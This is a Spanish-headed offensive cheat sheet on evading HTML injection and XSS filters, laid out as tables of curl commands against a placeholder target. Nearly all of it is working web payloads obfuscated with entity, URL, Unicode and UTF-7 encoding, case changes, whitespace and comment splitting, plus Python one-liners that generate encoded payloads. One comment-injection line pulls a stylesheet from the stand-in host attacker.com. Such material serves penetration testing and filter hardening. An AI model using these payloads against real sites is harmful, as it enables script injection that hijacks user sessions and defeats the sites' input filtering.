---
aliases:
  - HTML Injection Bypass
  - HTML Filter Evasion
  - HTML Entity Bypass
tags:
  - type/technique
  - vuln/html-injection
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTML Injection]]"
---
# HTML Injection - Bypass de Filtros

***

## HTML Entity Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?q=&#60;img src=x&#62;'` | Decimal entity `<` `>` — browser decodes | Filter blocks literal `<`. |
| `curl 'https://target/?q=&#x3c;img src=x&#x3e;'` | Hex entity bypass | Same. |
| `curl 'https://target/?q=&#0000060;img src=x&#0000062;'` | Zero-padded entity bypass length-check | Length filter. |
| `curl 'https://target/?q=&#60img src=x&#62'` (no semicolon) | Missing semicolon — some parsers tolerate | Lax parser. |
| `curl 'https://target/?q=&#x3C;img src=x&#x3E;'` | Mixed-case hex entity | Case filter. |
| `curl 'https://target/?q=&lt;script&gt;alert(1)&lt;/script&gt;'` (post-decode XSS) | Filter strips literal but decodes later | Pre-storage filter. |
| `curl 'https://target/?q=<i&#x6d;g src=x>'` | Half-encoded tag name | Partial filter. |
| `curl 'https://target/?q=<img s&#x72;c="x">'` | Attribute name encoded | Attr-name filter. |
| `curl 'https://target/?q=&#x3c;img&#x20;src&#x3d;x&#x3e;'` | Fully encoded full tag | Heavy filter. |
| `curl 'https://target/?q=＜img src=x＞'` (U+FF1C/FF1E full-width) | Unicode full-width less/greater than | NFKC normalize bypass. |
| `python3 -c "print('&#'+';&#'.join(str(ord(c)) for c in '<img src=x>'))"` | Generate decimal entity payload | DIY encoder. |
| `python3 -c "print(''.join(f'&#x{ord(c):x};' for c in '<img src=x onerror=alert(1)>'))"` | Generate hex entity payload | DIY hex encoder. |
^htmli-bypass-entity

___

## URL / Unicode Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?q=%3Cimg%20src%3Dx%3E'` | Standard URL encode `<` `>` | HTTP-layer filter. |
| `curl 'https://target/?q=%253Cimg%2520src%253Dx%253E'` | Double URL encode `%3C` → `%253C` | Multi-decode chain. |
| `curl --data-urlencode 'q=<img src=x>' https://target/x` | curl helper auto-encode | Easy encode. |
| `curl 'https://target/?q=%EF%BC%9Cimg src=x%EF%BC%9E'` | UTF-8 encoded U+FF1C/FF1E | Unicode normalize. |
| `curl 'https://target/?q=+ADw-img src=x+AD4-'` (UTF-7 legacy) | UTF-7 encoded angle brackets | Old browsers + charset. |
| `curl 'https://target/?q=%uFF1Cimg src=x%uFF1E'` (% u-encoding) | %u-encoding bypass | Legacy IE. |
| `curl --data-urlencode 'q=‮<rcs‭ipt>...' https://target/` | RTL override Unicode reorder | Visual bypass. |
| `curl 'https://target/?q=%3c%3Cimg src=x%3e%3E'` | Mixed case hex encoded | Case mix. |
| `curl 'https://target/?q=%C0%BCimg src=x%C0%BE'` (overlong UTF-8) | Overlong UTF-8 bypass | Old parser. |
| `curl 'https://target/?q=<img src=x>'` (JS-escape) | JS \u escape | JS context. |
| `python3 -c "import urllib.parse; print(urllib.parse.quote_plus('<img src=x>'))"` | Python URL encode | DIY URL encoder. |
| `python3 -c "s='<img src=x>'; print(''.join('%%%02X' % ord(c) for c in s))"` | Manual percent encoding | Custom encoder. |
^htmli-bypass-url

___

## Tag/Attribute Case Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?q=<SCRIPT>alert(1)</SCRIPT>'` | Uppercase tag bypass | Case-sensitive filter. |
| `curl 'https://target/?q=<ScRiPt>alert(1)</sCrIpT>'` | Mixed case | Same. |
| `curl 'https://target/?q=<IMG SRC=x onerror=alert(1)>'` | Uppercase attribute | Attr case filter. |
| `curl 'https://target/?q=<svG onload=alert(1)>'` | Non-standard tag less-filtered | Whitelist gap. |
| `curl 'https://target/?q=<MaTh href="javascript:alert(1)">CLICK</MaTh>'` | MathML tag less-filtered | MathML edge. |
| `curl 'https://target/?q=<details ontoggle=alert(1) open>x</details>'` | HTML5 details event-based XSS | HTML5 less-filtered. |
| `curl 'https://target/?q=<picture><source srcset=javascript:alert(1)></picture>'` | Picture/source modern HTML5 | Whitelist gap. |
| `curl 'https://target/?q=<     img     src=x     onerror=alert(1)>'` | Extra whitespace tolerated | Spaces in tag. |
| `curl $'https://target/?q=<img\\tsrc=x\\tonerror=alert(1)>'` | Tab separator in tag | Whitespace variants. |
| `curl $'https://target/?q=<img\\nsrc=x\\nonerror=alert(1)>'` | Newline separator | Multi-line tag. |
| `curl 'https://target/?q=<svg/onload=alert(1)>'` | Slash separator no whitespace | XML-style. |
| `curl 'https://target/?q=<img/src/=x/onerror=alert(1)>'` | Multi-slash separator | Bizarre but valid. |
| `curl 'https://target/?q=<a HrEf="javascript:alert(1)">x</a>'` | Mixed case href attribute | Same case bypass. |
^htmli-bypass-case

___

## Whitespace Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl $'https://target/?q=<img\\tsrc=x\\tonerror=alert(1)>'` | Tab between attrs | Browser normalizes. |
| `curl $'https://target/?q=<img\\nsrc=x\\nonerror=alert(1)>'` | Newline in tag | Same. |
| `curl $'https://target/?q=<img\\x0bsrc=x\\x0bonerror=alert(1)>'` | Vertical tab separator | Edge. |
| `curl $'https://target/?q=<img\\x0csrc=x\\x0conerror=alert(1)>'` | Form feed separator | Edge. |
| `curl $'https://target/?q=<img\\rsrc=x\\ronerror=alert(1)>'` | Carriage return separator | Same as newline. |
| `curl 'https://target/?q=<img   src   =   x   onerror   =   alert(1)>'` | Spaces around `=` | Whitespace-around-equals. |
| `curl 'https://target/?q=<img src=x onerror=alert(1)>'` | No quotes around attribute | Unquoted attrs valid. |
| `curl "https://target/?q=<img src='x' onerror='alert(1)'>"` | Single quotes | Both quote types valid. |
| `curl 'https://target/?q=<img src=\`x\` onerror=\`alert(1)\`>'` | Backtick quotes (legacy IE) | IE-specific. |
| `curl 'https://target/?q=<img src=&#x22;x&#x22; onerror=alert(1)>'` | Entity-encoded quotes | Quote filter. |
| `curl 'https://target/?q=<img src="  x" onerror=alert(1)>'` | Leading whitespace in attr | Attr value whitespace. |
| `curl 'https://target/?q=<img src=x onerror=alert(1)>>'` | Extra `>` tolerated | Extra char. |
| `curl 'https://target/?q=<img src=x onerror=alert(1) /'` | Missing `>` self-close | Edge parse. |
^htmli-bypass-whitespace

___

## Comment Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?q=<scr<!---->ipt>alert(1)</script>'` | Inline comment splits filter substring | Substring filter. |
| `curl 'https://target/?q=<scr<!-- -->ipt>alert(1)</script>'` | Same with whitespace inside | Same. |
| `curl 'https://target/?q=<img src=x --!> onerror=alert(1)>'` | Comment terminator `--!>` | Edge terminator. |
| `curl 'https://target/?q=<!--[if IE]><script>alert(1)</script><![endif]-->'` | IE conditional comment | IE-only. |
| `curl 'https://target/?q=<!--[if !IE]>--><script>alert(1)</script><!--<![endif]-->'` | Reverse IE conditional | Non-IE execute. |
| `curl 'https://target/?q=<!-- a --> alert(1) <!-- b -->'` | Multi-comment chained | Multi-comment parser. |
| `curl 'https://target/?q=<a href="javascript:/*--><img src=x onerror=alert(1)>*/">x</a>'` | Comment inside attr | Attr context bypass. |
| `curl 'https://target/?q=<style>/* */@import url(//attacker.com/x.css)</style>'` | CSS comment + @import bypass | CSS context. |
| `curl 'https://target/?q=<![CDATA[<script>alert(1)</script>]]>'` | XML CDATA section | XML serialization. |
| `curl 'https://target/?q=<? <script>alert(1)</script> ?>'` | Processing instruction | XML-only edge. |
| `curl 'https://target/?q=<!--<script>alert(1)//-->'` | Comment-script confusion | Old parser edge. |
| `curl 'https://target/?q=<![if IE]><script>alert(1)</script><![endif]>'` | Downlevel-revealed conditional | IE non-standard. |
^htmli-bypass-comment

***
